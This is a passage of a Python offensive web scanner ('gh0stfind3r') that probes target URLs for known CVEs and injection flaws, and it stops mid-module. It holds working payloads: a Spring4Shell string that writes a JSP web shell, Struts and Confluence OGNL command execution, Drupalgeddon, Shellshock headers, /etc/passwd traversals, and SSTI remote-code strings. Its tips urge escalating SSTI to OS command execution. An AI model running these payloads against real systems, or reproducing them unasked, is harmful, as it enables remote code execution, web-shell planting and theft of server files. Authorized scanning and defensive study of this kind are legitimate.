        print(f"\n  {yellow('Install APT tools:')}")
        print(f"  sudo apt install -y {' '.join(missing_apt)}")
    if missing_go:
        print(f"\n  {yellow('Install GO tools:')}")
        for t in missing_go:
            print(f"  {dim(tools[t][1])}")
    if missing_pip:
        print(f"\n  {yellow('Install PIP tools:')}")
        print(f"  pip3 install {' '.join(missing_pip)}")

# ─────────────────────────────────────────────
#  INTERACTIVE MENU
# ─────────────────────────────────────────────


# ════════════════════════════════════════════════════════════
#  EXTENDED MODULES  —  CVE / CWE / OWASP / Advanced Attacks
#  by GHOST BEROK  |  gh0stfind3r v4.0
# ════════════════════════════════════════════════════════════

CWE_MAP = {
    "sqli":       ("CWE-89",  "Improper Neutralization of Special Elements in SQL Commands"),
    "xss":        ("CWE-79",  "Improper Neutralization of Input During Web Page Generation"),
    "lfi":        ("CWE-22",  "Path Traversal"),
    "rfi":        ("CWE-98",  "PHP Remote File Inclusion"),
    "xxe":        ("CWE-611", "Improper Restriction of XML External Entity Reference"),
    "ssrf":       ("CWE-918", "Server-Side Request Forgery"),
    "csrf":       ("CWE-352", "Cross-Site Request Forgery"),
    "idor":       ("CWE-639", "Authorization Bypass Through User-Controlled Key"),
    "ssti":       ("CWE-94",  "Code Injection via Server-Side Template Injection"),
    "crlf":       ("CWE-93",  "CRLF Injection"),
    "open_redir": ("CWE-601", "URL Redirection to Untrusted Site"),
    "info_disc":  ("CWE-200", "Exposure of Sensitive Information"),
    "weak_auth":  ("CWE-287", "Improper Authentication"),
    "missing_auth":("CWE-306","Missing Authentication for Critical Function"),
    "priv_esc":   ("CWE-269", "Improper Privilege Management"),
    "deserial":   ("CWE-502", "Deserialization of Untrusted Data"),
    "cmd_inject": ("CWE-78",  "OS Command Injection"),
    "weak_crypto":("CWE-327", "Use of Broken/Risky Cryptographic Algorithm"),
    "hardcoded":  ("CWE-798", "Use of Hard-coded Credentials"),
    "race":       ("CWE-362", "Race Condition"),
    "header_inj": ("CWE-113", "HTTP Response Splitting"),
    "protype_pol":("CWE-1321","Prototype Pollution"),
    "cors":       ("CWE-942", "Permissive CORS Policy"),
    "clickjack":  ("CWE-1021","Improper Restriction of Rendered UI Layers"),
    "subdomain_to":("CWE-350","Subdomain Takeover (DNS Misconfiguration)"),
    "mass_assign":("CWE-915", "Improperly Controlled Modification of Object Attributes"),
    "nosqli":     ("CWE-943", "Improper Neutralization of Special Elements in NoSQL"),
    "jwt_vuln":   ("CWE-347", "Improper Verification of Cryptographic Signature"),
    "bola":       ("CWE-639", "Broken Object Level Authorization (BOLA/IDOR)"),
    "bfla":       ("CWE-285", "Broken Function Level Authorization"),
    "ratelimit":  ("CWE-307", "Improper Restriction of Excessive Auth Attempts"),
    "log4shell":  ("CVE-2021-44228", "Log4Shell – JNDI Injection in Log4j"),
    "spring4":    ("CVE-2022-22965","Spring4Shell – Spring Framework RCE"),
    "log_inject": ("CWE-117", "Improper Output Neutralization for Logs"),
}

# Built-in CVE fingerprint database
# Format: {cve_id: {keywords, paths, headers, body_sigs, severity, description, affected}}
CVE_DB = {
    # ── Log4Shell ──────────────────────────────────────────
    "CVE-2021-44228": {
        "name": "Log4Shell – Log4j RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-917",
        "affected": "Apache Log4j 2.0-beta9 to 2.14.1",
        "description": "JNDI injection via user-controlled input in log messages",
        "test_headers": ["X-Api-Version","X-Forwarded-For","User-Agent",
                         "X-Forwarded-Host","X-Client-IP","X-Remote-IP",
                         "Referer","CF-Connecting-IP","True-Client-IP",
                         "X-Originating-IP","Accept","Accept-Language"],
        "payload_template": "${{jndi:ldap://{{oob}}/a}}",
        "detection": "use OOB (interact.sh / Burp Collaborator)",
        "fix": "Upgrade Log4j to 2.17.1+; set log4j2.formatMsgNoLookups=true",
    },
    # ── Spring4Shell ───────────────────────────────────────
    "CVE-2022-22965": {
        "name": "Spring4Shell – Spring Framework RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-94",
        "affected": "Spring Framework < 5.3.18, < 5.2.20",
        "description": "Class property binding + Tomcat classloader → RCE",
        "paths": ["/"],
        "method": "POST",
        "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while(-1!%3D(a%3Din.read(b)))%7B%20out.println(new%20String(b))%3B%20%7D%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
        "fix": "Upgrade Spring Framework to 5.3.18+ or 5.2.20+",
    },
    # ── Shellshock ─────────────────────────────────────────
    "CVE-2014-6271": {
        "name": "Shellshock – Bash RCE via CGI",
        "severity": "CRITICAL",
        "cwe": "CWE-78",
        "affected": "Bash < 4.3 patch 25",
        "description": "Bash processes function definitions in env vars – CGI servers pass HTTP headers as env vars",
        "paths": ["/cgi-bin/test.cgi","/cgi-bin/status","/cgi-bin/test",
                  "/cgi-bin/admin.cgi","/cgi-bin/login.cgi","/cgi-sys/entropysearch.cgi"],
        "test_header": "() { :;}; echo Content-Type: text/plain; echo; echo SHELLSHOCK_VULNERABLE",
        "body_sig": "SHELLSHOCK_VULNERABLE",
        "fix": "Update bash; disable CGI or filter headers",
    },
    # ── Apache HTTPD Path Traversal ─────────────────────
    "CVE-2021-41773": {
        "name": "Apache 2.4.49 Path Traversal / RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-22",
        "affected": "Apache HTTPD 2.4.49",
        "description": "Path traversal and potential RCE via mod_cgi",
        "paths": [
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/cgi-bin/.%%32%65/.%%32%65/etc/passwd",
            "/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        ],
        "body_sigs": ["root:x:", "daemon:"],
        "fix": "Upgrade to Apache 2.4.51+",
    },
    "CVE-2021-42013": {
        "name": "Apache 2.4.49/2.4.50 Path Traversal (bypass)",
        "severity": "CRITICAL",
        "cwe": "CWE-22",
        "affected": "Apache HTTPD 2.4.49, 2.4.50",
        "description": "Double-encoding bypass of CVE-2021-41773 fix",
        "paths": [
            "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
            "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
        ],
        "body_sigs": ["root:x:","daemon:"],
        "fix": "Upgrade to Apache 2.4.51+",
    },
    # ── Nginx off-by-slash ─────────────────────────────────
    "CVE-2019-0148x-nginx-alias": {
        "name": "Nginx Alias Traversal (off-by-slash)",
        "severity": "HIGH",
        "cwe": "CWE-22",
        "affected": "Nginx with misconfigured alias directive",
        "description": "Missing trailing slash in alias → path traversal",
        "paths": ["/static../etc/passwd", "/assets../etc/passwd",
                  "/files../etc/passwd", "/images../etc/passwd"],
        "body_sigs": ["root:x:","daemon:"],
        "fix": "Add trailing slash to alias paths in nginx config",
    },
    # ── PHP CGI ────────────────────────────────────────────
    "CVE-2012-1823": {
        "name": "PHP CGI Query String RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-78",
        "affected": "PHP < 5.3.12, < 5.4.2 (CGI mode)",
        "description": "PHP CGI query string passed as command line arguments",
        "paths": ["/index.php?-s", "/?-s", "/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"],
        "body_sigs": ["<?php","source code","phpinfo"],
        "fix": "Upgrade PHP; disable CGI if unused",
    },
    # ── WordPress ──────────────────────────────────────────
    "CVE-2019-8942": {
        "name": "WordPress Post Meta RCE",
        "severity": "HIGH",
        "cwe": "CWE-94",
        "affected": "WordPress ≤ 5.0.0",
        "description": "Authenticated author can upload PHP via image meta crop",
        "paths": ["/wp-login.php", "/wp-admin/", "/wp-json/wp/v2/"],
        "body_sigs": ["WordPress","wp-content","wp-includes"],
        "fix": "Upgrade WordPress to 5.0.1+",
    },
    "CVE-2020-11738": {
        "name": "WordPress Duplicator Plugin LFI",
        "severity": "CRITICAL",
        "cwe": "CWE-22",
        "affected": "Duplicator plugin < 1.3.28",
        "description": "Unauthenticated LFI via installer file",
        "paths": ["/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../wp-config.php",
                  "/installer.php"],
        "body_sigs": ["DB_PASSWORD","DB_NAME","DB_USER","wp-config"],
        "fix": "Update Duplicator plugin; delete installer.php after install",
    },
    # ── Joomla ─────────────────────────────────────────────
    "CVE-2015-8562": {
        "name": "Joomla Object Injection RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-502",
        "affected": "Joomla 1.5.0 – 3.4.5",
        "description": "PHP object injection via User-Agent header → RCE",
        "paths": ["/index.php", "/"],
        "body_sigs": ["Joomla","joomla"],
        "fix": "Upgrade Joomla to 3.4.6+",
    },
    # ── Drupal (Drupalgeddon) ──────────────────────────────
    "CVE-2018-7600": {
        "name": "Drupalgeddon2 – Drupal RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-94",
        "affected": "Drupal < 7.58, 8.x < 8.3.9",
        "description": "Unauthenticated RCE via form API input sanitization",
        "paths": ["/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                  "/user/password?name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id"],
        "body_sigs": ["Drupal","drupal"],
        "fix": "Upgrade Drupal to 7.58 / 8.3.9 / 8.4.6 / 8.5.1+",
    },
    # ── Confluence ─────────────────────────────────────────
    "CVE-2022-26134": {
        "name": "Confluence OGNL Injection RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-74",
        "affected": "Confluence Server 1.3.0 – 7.18.0",
        "description": "Unauthenticated OGNL injection → RCE",
        "paths": ["/%24%7B%28%23a%3D%40org.apache.commons.lang.StringUtils%40EMPTY%29.%28%23b%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28new+java.lang.String%5B%5D%7B%22id%22%7D%29%29%7D/",
                  "/%24%7B7*7%7D/"],
        "body_sigs": ["atlassian","confluence","Page Not Found"],
        "fix": "Upgrade Confluence; block external access if possible",
    },
    # ── Struts ─────────────────────────────────────────────
    "CVE-2017-5638": {
        "name": "Apache Struts 2 RCE (Equifax breach)",
        "severity": "CRITICAL",
        "cwe": "CWE-78",
        "affected": "Struts 2.3.5 – 2.3.31, 2.5 – 2.5.10",
        "description": "OGNL injection via Content-Type header in file upload",
        "paths": ["/index.action", "/login.action", "/upload.action", "/*.action"],
        "test_header_name": "Content-Type",
        "test_header_val":  "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))).(#ros)}",
        "body_sigs": ["uid=", "root", "struts"],
        "fix": "Upgrade Struts to 2.3.32 / 2.5.10.1+",
    },
    # ── Jenkins ────────────────────────────────────────────
    "CVE-2024-23897": {
        "name": "Jenkins Arbitrary File Read",
        "severity": "CRITICAL",
        "cwe": "CWE-22",
        "affected": "Jenkins < 2.442, LTS < 2.426.3",
        "description": "Unauthenticated arbitrary file read via CLI parser",
        "paths": ["/jenkins", "/", "/login"],
        "body_sigs": ["Jenkins","hudson"],
        "fix": "Upgrade Jenkins to 2.442 / LTS 2.426.3+",
    },
    "CVE-2018-1000861": {
        "name": "Jenkins Stapler Arbitrary Code Execution",
        "severity": "CRITICAL",
        "cwe": "CWE-94",
        "affected": "Jenkins < 2.153, LTS < 2.138.3",
        "description": "Unauthenticated RCE via Stapler routing",
        "paths": ["/securityRealm/user/admin/descriptorByName/",
                  "/view/all/newJob"],
        "body_sigs": ["Jenkins","hudson"],
        "fix": "Upgrade Jenkins",
    },
    # ── GitLab ─────────────────────────────────────────────
    "CVE-2021-22205": {
        "name": "GitLab Unauthenticated RCE (ExifTool)",
        "severity": "CRITICAL",
        "cwe": "CWE-78",
        "affected": "GitLab CE/EE 11.9 – 13.10.2",
        "description": "ExifTool image metadata injection → RCE via upload",
        "paths": ["/users/sign_in", "/gitlab"],
        "body_sigs": ["GitLab","gitlab","gl-"],
        "fix": "Upgrade GitLab to 13.10.3+",
    },
    # ── Exchange ProxyLogon ─────────────────────────────────
    "CVE-2021-26855": {
        "name": "Exchange ProxyLogon SSRF → RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-918",
        "affected": "Exchange Server 2013/2016/2019 (unpatched)",
        "description": "Pre-auth SSRF allows auth bypass, then PostBody deserialization → RCE",
        "paths": ["/ecp/", "/owa/", "/autodiscover/"],
        "body_sigs": ["Microsoft Exchange","X-OWA-Version","owa"],
        "fix": "Apply March 2021 CU / Security Update from Microsoft",
    },
    # ── Grafana ────────────────────────────────────────────
    "CVE-2021-43798": {
        "name": "Grafana Path Traversal (Plugin Assets)",
        "severity": "HIGH",
        "cwe": "CWE-22",
        "affected": "Grafana 8.0.0 – 8.3.0",
        "description": "Unauthenticated path traversal via plugin directory URL",
        "paths": [
            "/public/plugins/alertlist/../../../../../../../etc/passwd",
            "/public/plugins/graph/../../../../../../../etc/passwd",
            "/public/plugins/text/../../../etc/passwd",
        ],
        "body_sigs": ["root:x:","daemon:"],
        "fix": "Upgrade Grafana to 8.3.1+",
    },
    # ── SolarWinds ─────────────────────────────────────────
    "CVE-2021-35211": {
        "name": "SolarWinds Serv-U RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-78",
        "affected": "SolarWinds Serv-U < 15.2.3 HF2",
        "description": "Pre-auth RCE via SSH transport layer",
        "paths": ["/"],
        "body_sigs": ["Serv-U","SolarWinds"],
        "fix": "Apply Serv-U 15.2.3 HF2+",
    },
    # ── VMware ─────────────────────────────────────────────
    "CVE-2021-21985": {
        "name": "VMware vCenter RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-20",
        "affected": "vCenter Server 6.5/6.7/7.0",
        "description": "Plugin input validation flaw → unauthenticated RCE",
        "paths": ["/ui", "/vsphere-ui", "/vcac/"],
        "body_sigs": ["vSphere","VMware","vCenter"],
        "fix": "Apply VMware SA-2021-0010",
    },
    # ── F5 BIG-IP ──────────────────────────────────────────
    "CVE-2022-1388": {
        "name": "F5 BIG-IP Auth Bypass & RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-287",
        "affected": "BIG-IP 11.6.x – 16.1.x",
        "description": "iControl REST auth bypass allows unauthenticated RCE",
        "paths": ["/mgmt/tm/util/bash"],
        "test_headers": {"X-F5-Auth-Token":"","Authorization":"Basic YWRtaW46"},
        "body_sigs": ["BIG-IP","F5","iControl"],
        "fix": "Upgrade BIG-IP; block mgmt port from internet",
    },
    # ── Citrix ─────────────────────────────────────────────
    "CVE-2019-19781": {
        "name": "Citrix ADC / NetScaler Path Traversal RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-22",
        "affected": "Citrix ADC / NetScaler Gateway – multiple versions",
        "description": "Directory traversal allows template injection → RCE",
        "paths": [
            "/vpn/../vpns/cfg/smb.conf",
            "/vpn/../vpns/portal/scripts/newbm.pl",
        ],
        "body_sigs": ["smb.conf","workgroup","Citrix","NetScaler"],
        "fix": "Apply Citrix ADC patch; restrict VPN access",
    },
    # ── Palo Alto ──────────────────────────────────────────
    "CVE-2019-1579": {
        "name": "Palo Alto GlobalProtect RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-134",
        "affected": "PAN-OS 7.1 < 7.1.19, 8.0 < 8.0.12, 8.1 < 8.1.3",
        "description": "Format string vulnerability in GlobalProtect → RCE",
        "paths": ["/global-protect/login.esp", "/esp/gp-cvpnf.esp"],
        "body_sigs": ["GlobalProtect","PAN-OS","Palo Alto"],
        "fix": "Upgrade PAN-OS to patched version",
    },
    # ── Apache Solr ────────────────────────────────────────
    "CVE-2019-17558": {
        "name": "Apache Solr Velocity SSTI RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-74",
        "affected": "Solr 5.0.0 – 8.3.1",
        "description": "Velocity template injection via params → RCE",
        "paths": ["/solr/", "/solr/admin/", "/solr/#/"],
        "body_sigs": ["Solr","apache solr","SolrCore"],
        "fix": "Upgrade Solr; disable remote streaming",
    },
    # ── Elasticsearch ──────────────────────────────────────
    "CVE-2014-3120": {
        "name": "Elasticsearch MVEL Groovy RCE",
        "severity": "CRITICAL",
        "cwe": "CWE-94",
        "affected": "Elasticsearch < 1.3.8, < 1.4.3",
        "description": "Dynamic script execution allows RCE via search API",
        "paths": ["/_search?q=*:*",
                  "/_search",
                  "/_all/_search"],
        "body_sigs": ["elasticsearch","hits","indices"],
        "fix": "Disable dynamic scripting; upgrade ES",
    },
    # ── Heartbleed ─────────────────────────────────────────
    "CVE-2014-0160": {
        "name": "Heartbleed – OpenSSL Memory Leak",
        "severity": "CRITICAL",
        "cwe": "CWE-125",
        "affected": "OpenSSL 1.0.1 – 1.0.1f",
        "description": "TLS heartbeat extension reads past buffer boundary → memory leak",
        "detection": "Use nmap: nmap -p443 --script ssl-heartbleed <target>",
        "fix": "Upgrade OpenSSL to 1.0.1g+; reissue all certs",
    },
}


# ════════════════════════════════════════════════════════════
#  MODULE A — CVE FINGERPRINT SCANNER
# ════════════════════════════════════════════════════════════
def module_cve_scanner(url, domain):
    section("CVE Fingerprint Scanner")
    info(f"Checking {len(CVE_DB)} known CVEs against {bold(url)}")

    # First: fingerprint the server to narrow down checks
    code0, headers0, body0 = http_get(url, 10)
    srv = (headers0.get("Server") or headers0.get("server") or "").lower()
    powered = (headers0.get("X-Powered-By") or "").lower()
    body_l  = body0.lower()

    server_tags = srv + " " + powered + " " + body_l

    matched_cves = []
    hits = 0

    for cve_id, cve in CVE_DB.items():
        # Check if any body/header signatures match to fingerprint tech
        body_sigs = cve.get("body_sigs", [])
        paths     = cve.get("paths", ["/"])

        # Quick tech match before testing
        cve_name  = cve["name"].lower()
        # Apache
        if "apache" in cve_name and "apache" not in server_tags and "http" not in server_tags:
            if any(s in body_l for s in body_sigs):
                pass  # still test if body matches
            else:
                continue

        # Test each path
        for path in paths[:3]:
            test_url = url.rstrip("/") + path if path != "/" else url
            c, h, b = http_get(test_url, 7)
            b_lower = b.lower()

            # Check body signatures
            for sig in body_sigs:
                if sig.lower() in b_lower:
                    severity = cve.get("severity","HIGH")
                    vuln(severity,
                         f"{cve_id} — {cve['name']}\n"
                         f"       {dim('Path:')} {path}\n"
                         f"       {dim('Affected:')} {cve.get('affected','')}\n"
                         f"       {dim('Fix:')} {cve.get('fix','See advisory')}")
                    add_finding(severity, f"{cve_id}: {cve['name']}", cve.get("fix",""))
                    matched_cves.append(cve_id)
                    hits += 1
                    break

        # Special: Shellshock header test
        if cve_id == "CVE-2014-6271":
            for path in ["/cgi-bin/test.cgi","/cgi-bin/status","/cgi-bin/test"]:
                c2, _, b2 = http_get(url.rstrip("/")+path, 5, {
                    "User-Agent":  "() { :;}; echo Content-Type: text/plain; echo; echo SHELLSHOCK_VULNERABLE",
                    "Referer":     "() { :;}; echo Content-Type: text/plain; echo; echo SHELLSHOCK_VULNERABLE",
                    "Cookie":      "() { :;}; echo Content-Type: text/plain; echo; echo SHELLSHOCK_VULNERABLE",
                })
                if "SHELLSHOCK_VULNERABLE" in b2:
                    vuln("CRITICAL", f"CVE-2014-6271 Shellshock CONFIRMED on {path}")
                    hits += 1

    # Log4Shell advisory
    info("Log4Shell (CVE-2021-44228) — requires OOB testing:")
    tip("  Use: https://log4shell.huntress.com or Burp Collaborator")
    tip("  Inject ${jndi:ldap://YOUR-OOB-HOST/a} in all headers")
    tip("  Headers to test: User-Agent, X-Forwarded-For, X-Api-Version, Referer")

    ok(f"CVE scan complete — {hits} potential matches found")
    return matched_cves


# ════════════════════════════════════════════════════════════
#  MODULE B — SSTI (Server-Side Template Injection)
#             CWE-94 / affects: Jinja2, Twig, Freemarker, Pebble, Smarty
# ════════════════════════════════════════════════════════════
def module_ssti(url):
    section("SSTI — Server-Side Template Injection  [CWE-94]")

    # Detection payloads (math expression — safe, just checks if evaluated)
    ssti_probes = {
        "Jinja2/Twig/Flask":     ("{{7*7}}", "49"),
        "Jinja2 (alt)":          ("{{7*'7'}}", "7777777"),
        "Freemarker":            ("${7*7}", "49"),
        "Smarty":                ("{7*7}", "49"),
        "Mako":                  ("${7*7}", "49"),
        "Tornado":               ("{{7*7}}", "49"),
        "Pebble":                ("{{7*7}}", "49"),
        "Handlebars":            ("{{#with '7' as |num|}}{{num}}{{/with}}", "7"),
        "Velocity":              ("#set($x=7*7)$x", "49"),
        "ERB (Ruby)":            ("<%= 7*7 %>", "49"),
        "Groovy":                ("${7*7}", "49"),
        "EL (Java)":             ("${7*7}", "49"),
        "Thymeleaf":             ("[[${7*7}]]", "49"),
    }

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    if not params:
        info("No URL params. Add ?q=test to your URL for SSTI testing")
        tip("SSTI also appears in: search boxes, profile names, email fields, filenames")
        return

    info(f"Testing {len(params)} params × {len(ssti_probes)} template engines...")
    for param in params:
        for engine, (payload, expected) in ssti_probes.items():
            new_params = {**params, param: [payload]}
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True))
            )
            c, h, body = http_get(test_url, 6)
            if expected in body:
                vuln("CRITICAL",
                     f"SSTI confirmed! Engine: {engine}  Param: '{param}'  Payload: {payload}\n"
                     f"       {dim('Expected in response:')} {expected}\n"
                     f"       {dim('CWE:')} CWE-94 | Improper Code Generation\n"
                     f"       {dim('Next:')} Try RCE payloads for {engine}")
                _ssti_rce_hints(engine, param)

    tip("SSTI → RCE: once confirmed, escalate to OS command execution")
    tip("Tool: tplmap — github.com/epinna/tplmap")

def _ssti_rce_hints(engine, param):
    rce_map = {
        "Jinja2/Twig/Flask": [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{'id'|popen|string}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        ],
        "Freemarker": [
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        ],
        "Velocity": [
            "#set($run=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))",
        ],
        "ERB (Ruby)": ["<%= `id` %>", "<%= system('id') %>"],
    }
    hints = rce_map.get(engine, [])
    if hints:
        tip(f"  RCE payloads for {engine} (test in Burp):")
        for h in hints:
            tip(f"    {cyan(h)}")


# ════════════════════════════════════════════════════════════
#  MODULE C — CRLF INJECTION  [CWE-93]
# ════════════════════════════════════════════════════════════
def module_crlf(url):
    section("CRLF Injection  [CWE-93]")

    # Payloads — inject Set-Cookie header to confirm CRLF
    crlf_payloads = [
        "%0d%0aSet-Cookie:gh0st=pwned",
        "%0aSet-Cookie:gh0st=pwned",
        "%0d%0a%20Set-Cookie:gh0st=pwned",
        "%E5%98%8D%E5%98%8ASet-Cookie:gh0st=pwned",  # Unicode CRLF
        "%E5%98%8D%E5%98%8A%20Set-Cookie:gh0st=pwned",
        "\r\nSet-Cookie:gh0st=pwned",
        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:35%0d%0a%0d%0a<h1>CRLF Header Split</h1>",
    ]

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    # Test in URL path
    path_targets = [
        f"{url.rstrip('/')}{payload}" for payload in crlf_payloads[:3]
    ]

    info("Testing CRLF in URL path...")
    for test_url in path_targets:
        c, h, b = http_get(test_url, 5, follow=False)
        all_hdrs = str(h).lower()
        if "gh0st=pwned" in all_hdrs or "gh0st" in str(h.get("set-cookie","")).lower():
            vuln("HIGH", f"CRLF Injection confirmed!\n"
                 f"       URL: {test_url[:80]}\n"
                 f"       CWE-93: HTTP Response Splitting\n"
                 f"       Impact: Cookie injection, XSS via header, cache poisoning")

    # Test in redirect params
    redirect_params = [p for p in params if any(k in p.lower() for k in
                       ["redirect","next","url","return","dest","location","goto"])]
    if redirect_params:
        info(f"Testing CRLF in redirect params: {redirect_params}")
        for param in redirect_params:
            for payload in crlf_payloads[:4]:
                new_params = {**params, param: [payload]}
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True))
                )
                c, h, b = http_get(test_url, 5, follow=False)
                if "gh0st" in str(h.get("Set-Cookie","") or h.get("set-cookie","")).lower():
                    vuln("HIGH", f"CRLF in redirect param '{param}' → header injection!")

    tip("CRLF → XSS: inject Content-Type and craft HTML body")
    tip("CRLF → Cache Poisoning: inject cache-control headers")


# ════════════════════════════════════════════════════════════
#  MODULE D — PROTOTYPE POLLUTION  [CWE-1321]
# ════════════════════════════════════════════════════════════
def module_prototype_pollution(url):
    section("Prototype Pollution  [CWE-1321]")

    # Server-side prototype pollution probes
    pp_params = [
        "__proto__[gh0st]=pwned",
        "constructor[prototype][gh0st]=pwned",
        "__proto__.gh0st=pwned",
        "constructor.prototype.gh0st=pwned",
    ]

    info("Testing server-side prototype pollution in URL params...")
    parsed = urllib.parse.urlparse(url)
    base = url.split("?")[0]

    for payload in pp_params:
        test_url = f"{base}?{payload}"
        c, h, body = http_get(test_url, 6)
        # Check if injected key appears in response
        if "pwned" in body or "gh0st" in body:
            vuln("HIGH", f"Prototype Pollution confirmed!\n"
                 f"       Payload: {payload}\n"
                 f"       CWE-1321: Prototype Pollution\n"
                 f"       Impact: Auth bypass, DoS, potential RCE in some frameworks")

    # JSON body prototype pollution
    json_payloads = [
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
        '{"__proto__":{"isAdmin":true,"role":"admin"}}',
    ]

    api_endpoints = [url, base + "/api", base + "/api/v1", base + "/login", base + "/register"]
    info("Testing prototype pollution in JSON POST body...")
    for ep in api_endpoints[:3]:
        for jp in json_payloads[:2]:
            c, h, b = http_post(ep, jp, content_type="application/json")
            if c == 200 and ("admin" in b.lower() or "true" in b.lower()):
                vuln("HIGH", f"Possible prototype pollution via JSON body on {ep}")

    tip("Client-side PP: check JS files for lodash merge, jQuery extend, Object.assign")
    tip("Tool: ppfuzz — github.com/nikitastupin/ppfuzz")


# ════════════════════════════════════════════════════════════
#  MODULE E — DESERIALIZATION  [CWE-502]
# ════════════════════════════════════════════════════════════
def module_deserialization(url):
    section("Deserialization Vulnerability Detection  [CWE-502]")

    # Magic bytes for serialized objects
    deser_sigs = {
        "Java (base64)":   "rO0AB",                  # base64 of \xac\xed\x00\x05
        "Java (hex)":      "aced0005",
        "PHP serialize":   r'a:\d+:\{|O:\d+:"',
        "Python pickle":   "80 04 95",
        ".NET ViewState":  "/wEy",
        "Ruby Marshal":    "\x04\x08",
        "Node.js":         "_$$ND_FUNC$$_",
    }

    info("Scanning cookies and params for serialized objects...")
    c, h, body = http_get(url, 8)
    cookies = h.get("Set-Cookie", h.get("set-cookie", ""))

    # Check cookies for serialized data
    for name, sig in deser_sigs.items():
        if sig in cookies or sig in body:
            vuln("HIGH", f"Serialized data detected ({name})\n"
                 f"       CWE-502: Deserialization of Untrusted Data\n"
                 f"       Next: Craft malicious payload with ysoserial / phpggc")
            add_finding("HIGH", f"Deserialization risk: {name} detected")

    # Check for ViewState (ASP.NET)
    vs_match = re.search(r'__VIEWSTATE[^>]+value="([^"]+)"', body)
    if vs_match:
        vs = vs_match.group(1)
        info(f"ViewState found: {vs[:40]}...")
        if not re.search(r'__VIEWSTATEMAC|__VIEWSTATEGENERATOR', body):
            vuln("HIGH", ".NET ViewState without MAC validation — deserialize and tamper!")
        else:
            # Check if MAC key is weak
            ok("ViewState MAC validation present — test with weak key bruteforce")
            tip("Tool: Blacklist3r / ViewGen to bruteforce ViewState MAC key")

    # Java deserialization endpoints
    java_endpoints = [
        "/api/endpoint", "/rpc", "/ws", "/service",
        "/jmx", "/jndi", "/iiop", "/t3",  # WebLogic T3
    ]
    info("Probing Java deserialization endpoints...")
    java_sig = b'\xac\xed\x00\x05'
    for path in java_endpoints:
        ep = url.rstrip("/") + path
        try:
            req = urllib.request.Request(ep, data=java_sig, method="POST",
                                         headers={"User-Agent": UA, "Content-Type":"application/x-java-serialized-object"})
            with urllib.request.urlopen(req, timeout=5) as r:
                resp_body = r.read()
                if b'\xac\xed' in resp_body or b'java' in resp_body.lower():
                    vuln("CRITICAL", f"Java deserialization endpoint responds at {ep}")
        except:
            pass

    tip("Tools: ysoserial (Java), phpggc (PHP), PHPGGC, marshalsec")
    tip("Gadget chains: CommonsCollections, Spring, Groovy, AspectJWeaver")


# ════════════════════════════════════════════════════════════
#  MODULE F — COMMAND INJECTION  [CWE-78]
# ════════════════════════════════════════════════════════════
def module_cmd_injection(url):
    section("OS Command Injection  [CWE-78]")

    # Safe detection payloads (time-based and output-based)
    cmd_payloads = [
        # Output-based (check for specific string in response)
        (";echo gh0st_pwned_cmd", "gh0st_pwned_cmd"),
